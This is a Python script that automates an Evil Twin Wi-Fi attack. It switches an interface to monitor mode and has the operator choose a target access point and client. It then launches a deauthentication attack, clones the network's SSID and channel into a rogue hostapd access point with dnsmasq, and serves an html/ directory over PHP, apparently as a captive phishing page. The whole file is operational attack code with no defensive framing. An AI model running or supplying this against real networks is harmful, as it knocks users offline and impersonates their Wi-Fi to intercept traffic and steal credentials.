import os
import signal
from subprocess import *
from time import sleep
import wifi_scaner


def handler(signum, frame):
    print("\nReturning everything to normal :)\n")
    # print("Returning iface to managed...")
    call(["sudo", "killall", "dnsmasq"])
    call(["sudo", "systemctl", "restart", "NetworkManager"])
    call(["sudo", "systemctl", "restart", "systemd-resolved"])
    call(["sudo", "ifconfig", "wlx00c140610e6c", "down"])
    call(["sudo", "iwconfig", "wlx00c140610e6c", "mode", "managed"])
    call(["sudo", "ifconfig", "wlx00c140610e6c", "up"])


signal.signal(signal.SIGINT, handler)

# Stopping network services
call(["sudo", "systemctl", "stop", "NetworkManager"])
call(["sudo", "systemctl", "stop", "systemd-resolved"])
sleep(1.5)

print("Setting up iface to monitor...")
call(["sudo", "ifconfig", "wlx00c140610e6c", "down"])
call(["sudo", "iwconfig", "wlx00c140610e6c", "mode", "monitor"])
call(["sudo", "ifconfig", "wlx00c140610e6c", "up"])

# Choosing AP target
ap = wifi_scaner.get_networks()
ap_mac = input("Choose ap: ")
ssid = ap.loc[ap_mac].values[0]
channel = ap.loc[ap_mac].values[2]

# Setting the ap channel
os.system(f"iwconfig wlx00c140610e6c channel {channel}")

# Choosing target client
call(["sudo", "python3", "connected_dev.py", ap_mac])
target_mac = input("Choose target: ")

# Starting de-authentication attack
call(["sudo", "gnome-terminal", "--", "python3", "deauth.py", ap_mac, target_mac])
sleep(2)

# Setting up the ap configurations
f = open("hostapd.conf", "w")
f.write(f"interface=wlo1\ndriver=nl80211\nssid={ssid}\nchannel={channel}\n")
f.close()

# Setting up the route table
call(["sudo", "ifconfig", "wlo1", "up", "10.0.10.1", "netmask", "255.255.255.0"])
sleep(1)
call(["sudo", "route", "add", "-net", "10.0.10.0", "netmask", "255.255.255.0", "gw", "10.0.10.1"])
sleep(1)

# Start the EvilTwin attack
call(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])
sleep(2)
call(["sudo", "gnome-terminal", "--", "php", "-S", "10.0.10.1:80", "-t", "html/"])
sleep(2)
call(["sudo", "hostapd", "hostapd.conf"])


